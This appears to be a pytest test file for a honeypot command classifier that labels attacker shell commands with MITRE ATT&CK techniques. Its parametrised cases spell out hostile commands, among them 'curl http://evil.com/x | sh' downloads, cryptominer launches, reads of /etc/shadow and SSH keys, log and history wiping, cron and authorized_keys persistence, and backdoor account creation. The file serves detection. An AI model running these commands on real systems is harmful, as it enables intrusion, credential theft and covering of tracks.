"""Tests for the rule-based intent classifier."""

import pytest
from app.services.classifier import classify_command, classify_login


# ---------------------------------------------------------------------------
# classify_command — parameterised over every intent category
# ---------------------------------------------------------------------------

class TestClassifyCommand:
    """Each case is (input_command, expected_intent, expected_mitre_id)."""

    # -- Cryptomining --
    @pytest.mark.parametrize("cmd, mitre", [
        ("./xmrig --donate-level 1", "T1496"),
        ("wget http://pool.minexmr.com/miner", "T1496"),
        ("curl http://evil.com/kinsing", "T1496"),
        ("echo stratum+tcp://pool:3333", "T1496"),
        ("/tmp/kdevtmpfsi", "T1496"),
        ("hashvault", "T1496"),
        ("cryptonight", "T1496"),
    ])
    def test_cryptomining(self, cmd, mitre):
        intent, mitre_id = classify_command(cmd)
        assert intent == "cryptomining"
        assert mitre_id == mitre

    # -- Malware deployment --
    @pytest.mark.parametrize("cmd, mitre", [
        ("wget http://evil.com/payload.sh", "T1105"),
        ("curl http://evil.com/x | sh", "T1105"),
        ("curl -O http://evil.com/bin", "T1105"),
        ("tftp -g -r payload 1.2.3.4", "T1105"),
        ("chmod +x /tmp/payload", "T1222"),
        ("chmod 777 /tmp/evil", "T1222"),
        ("./bot", "T1059.004"),
        ("/tmp/.hidden", "T1059.004"),
        ("busybox wget http://evil.com/a", "T1105"),
        ("busybox tftp evil.com", "T1105"),
        ("echo aGVsbG8= | base64 -d", "T1027"),
        ("base64 --decode payload.b64", "T1027"),
    ])
    def test_malware_deployment(self, cmd, mitre):
        intent, mitre_id = classify_command(cmd)
        assert intent == "malware_deployment"
        assert mitre_id == mitre

    # -- Persistence --
    @pytest.mark.parametrize("cmd, mitre", [
        ("crontab -l", "T1053.003"),
        ("cat /var/spool/cron/root", "T1053.003"),
        ("echo '* * * * * /tmp/x' >> /etc/cron.d/x", "T1053.003"),
        ("echo key >> ~/.ssh/authorized_keys", "T1098.004"),
        ("chattr +i /tmp/malware", "T1222"),
        ("nohup ./bot &", "T1053"),
        ("setsid", "T1053"),
        ("disown %1", "T1053"),
        ("echo '/tmp/x' >> /etc/rc.local", "T1037"),
        ("systemctl enable evil.service", "T1037"),
        ("chattr -ia /root/.ssh", "T1098.004"),
        ("chattr -i ~/.ssh/authorized_keys", "T1098.004"),
        ("lockr -ia /root/.ssh", "T1098.004"),
    ])
    def test_persistence(self, cmd, mitre):
        intent, mitre_id = classify_command(cmd)
        assert intent == "persistence"
        assert mitre_id == mitre

    # -- Credential theft --
    @pytest.mark.parametrize("cmd, mitre", [
        ("cat /etc/shadow", "T1003.008"),
        ("cat ~/.ssh/id_rsa", "T1552.004"),
        ("cat key.pem", "T1552.004"),
        ("cat ~/.bash_history", "T1552.003"),
        ("cat ~/.mysql_history", "T1552.003"),
        ("cat /etc/my.cnf", "T1552.001"),
        ("cat ~/.pgpass", "T1552.001"),
        ("cat .env", "T1552.001"),
    ])
    def test_credential_theft(self, cmd, mitre):
        intent, mitre_id = classify_command(cmd)
        assert intent == "credential_theft"
        assert mitre_id == mitre

    # -- Sabotage --
    @pytest.mark.parametrize("cmd, mitre", [
        ("rm -rf /var/log/auth.log", "T1070.002"),
        ("rm access.log", "T1070.002"),
        ("history -c", "T1070.003"),
        ("unset HISTFILE", "T1070.003"),
        ("iptables -F", "T1562.004"),
        ("ufw disable", "T1562.004"),
        ("pkill sshd", "T1489"),
        ("killall node", "T1489"),
        ("kill -9 1234", "T1489"),
    ])
    def test_sabotage(self, cmd, mitre):
        intent, mitre_id = classify_command(cmd)
        assert intent == "sabotage"
        assert mitre_id == mitre

    # -- Reconnaissance --
    @pytest.mark.parametrize("cmd, mitre", [
        ("uname -a", "T1082"),
        ("cat /proc/cpuinfo", "T1082"),
        ("cat /etc/passwd", "T1087"),
        ("lastlog", "T1087"),
        ("whoami", "T1033"),
        ("id", "T1033"),
        ("ifconfig", "T1016"),
        ("ip addr show", "T1016"),
        ("hostname", "T1016"),
        ("netstat -tulnp", "T1049"),
        ("ss -tulnp", "T1049"),
        ("ps aux", "T1057"),
        ("top", "T1057"),
        ("df -h", "T1082"),
        ("free -m", "T1082"),
        ("ls /", "T1083"),
        ("pwd", "T1083"),
        ("find / -name '*.conf'", "T1083"),
        ("lscpu", "T1082"),
        ("nproc", "T1082"),
        ("cat /proc/uptime", "T1082"),
        ("cat /proc/meminfo", "T1082"),
        ("uptime", "T1082"),
        ("ssh -V", "T1082"),
        ('echo -e "\\x6F\\x6B"', "T1082"),
        ("/ip cloud print", "T1082"),
        ("/system resource print", "T1082"),
        ("which gcc", "T1083"),
        ("command -v python3", "T1083"),
        ("for d in $HOME /tmp /var/tmp /dev/shm; do echo $d; done", "T1083"),
        ("history", "T1552.003"),
        ("history | tail", "T1552.003"),
        ("env", "T1082"),
        ("env | grep PATH", "T1082"),
    ])
    def test_reconnaissance(self, cmd, mitre):
        intent, mitre_id = classify_command(cmd)
        assert intent == "reconnaissance"
        assert mitre_id == mitre

    # -- Word-boundary regressions: substrings must not trigger rules --
    @pytest.mark.parametrize("cmd", [
        ("echo droid"),          # "id" inside a word
        ("echo rapid fire"),     # "id" inside a word
        ("grep -w root foo"),    # "-w" flag is not the "w" command
        ("echo tools list"),     # "ls" inside a word
        ("echo blast off"),      # "last" inside a word
    ])
    def test_substrings_do_not_match(self, cmd):
        intent, _ = classify_command(cmd)
        assert intent == "unknown"

    def test_bare_ls_is_reconnaissance(self):
        assert classify_command("ls") == ("reconnaissance", "T1083")

    # -- Unknown / default --
    def test_unknown_empty_string(self):
        assert classify_command("") == ("unknown", "T1059")

    def test_unknown_no_match(self):
        assert classify_command("echo hello world") == ("unknown", "T1059")

    def test_unknown_whitespace(self):
        assert classify_command("   ") == ("unknown", "T1059")

    # -- Case insensitivity --
    def test_case_insensitive_wget(self):
        intent, _ = classify_command("WGET HTTP://EVIL.COM/PAYLOAD")
        assert intent == "malware_deployment"

    def test_case_insensitive_uname(self):
        intent, _ = classify_command("Uname -A")
        assert intent == "reconnaissance"

    # -- Priority: first match wins --
    def test_priority_cryptomining_over_malware(self):
        # xmrig match should win over wget match
        intent, mitre_id = classify_command("wget http://pool.minexmr.com/xmrig")
        assert intent == "cryptomining"
        assert mitre_id == "T1496"

    def test_priority_malware_over_persistence(self):
        # wget should match before crontab
        intent, _ = classify_command("wget http://evil.com/crontab")
        assert intent == "malware_deployment"


# ---------------------------------------------------------------------------
# classify_login
# ---------------------------------------------------------------------------

class TestFingerprintFilesRegardlessOfReader:
    """The rules used to require `cat` before a fingerprint file.

    Attackers read /proc/version and friends with head, awk, `[ -f ... ]` or a
    while-read loop far more often than with cat, so the cat-anchored rules
    matched none of the 8,932 commands that landed in `unknown` in production.
    What identifies the intent is the file being read, not the tool used.
    """

    @pytest.mark.parametrize("cmd", [
        "head -1 /proc/version | cut -d -f1",
        "[ -f /proc/version ]",
        "( [ -f /proc/version ]",
        "[ -f /etc/os-release ]",
        "awk /MemTotal/{print $2} /proc/meminfo 2 > /dev/null",
        'm=0; while read k v r; do [ "$k" = MemTotal: ] && { m=$v; break; }; done < /proc/meminfo',
        "grep -c ^processor /proc/cpuinfo",
        "grep 'model name' /proc/cpuinfo 2>/dev/null | head -1",
    ])
    def test_system_fingerprint_files_are_reconnaissance(self, cmd):
        assert classify_command(cmd) == ("reconnaissance", "T1082")

    @pytest.mark.parametrize("cmd", [
        "wc -l < /etc/passwd 2 > /dev/null",
        "cat /etc/passwd",
    ])
    def test_account_files_are_reconnaissance(self, cmd):
        assert classify_command(cmd) == ("reconnaissance", "T1087")

    @pytest.mark.parametrize("cmd", [
        "rpm -qa 2 > /dev/null | wc -l",
        "dpkg -l 2 > /dev/null | grep -c ^ii",
    ])
    def test_package_inventory_is_software_discovery(self, cmd):
        assert classify_command(cmd) == ("reconnaissance", "T1518")

    def test_df_with_a_path_not_just_a_flag(self, cmd=None):
        """`df\\s+-` missed `df /`, which is how the real samples call it."""
        assert classify_command("df / 2 > /dev/null | awk NR==2{print $2}")[0] == "reconnaissance"

    def test_shadow_still_outranks_passwd(self):
        """Ordering guard: credential theft must keep winning over recon."""
        assert classify_command("cat /etc/shadow") == ("credential_theft", "T1003.008")

    def test_download_still_outranks_fingerprint_read(self):
        """A command doing both is malware deployment, not recon."""
        intent, _ = classify_command("wget http://evil.com/x; cat /proc/version")
        assert intent == "malware_deployment"


class TestAccountCreationIsPersistence:
    """Creating a local account on a honeypot is a backdoor, not noise.

    These went to `unknown` in production, so an attacker adding themselves to
    sudo produced no signal at all.
    """

    @pytest.mark.parametrize("cmd, mitre", [
        ("useradd -m -s /bin/bash admin1", "T1136.001"),
        ("adduser backdoor", "T1136.001"),
    ])
    def test_account_creation(self, cmd, mitre):
        assert classify_command(cmd) == ("persistence", mitre)

    @pytest.mark.parametrize("cmd", [
        "usermod -aG sudo admin1",
        "echo admin1:modzmodz | chpasswd",
    ])
    def test_account_manipulation(self, cmd):
        assert classify_command(cmd) == ("persistence", "T1098")


class TestClassifyLogin:
    def test_failed_login(self):
        assert classify_login(False) == ("brute_force", "T1110")

    def test_successful_login(self):
        assert classify_login(True) == ("brute_force", "T1110")
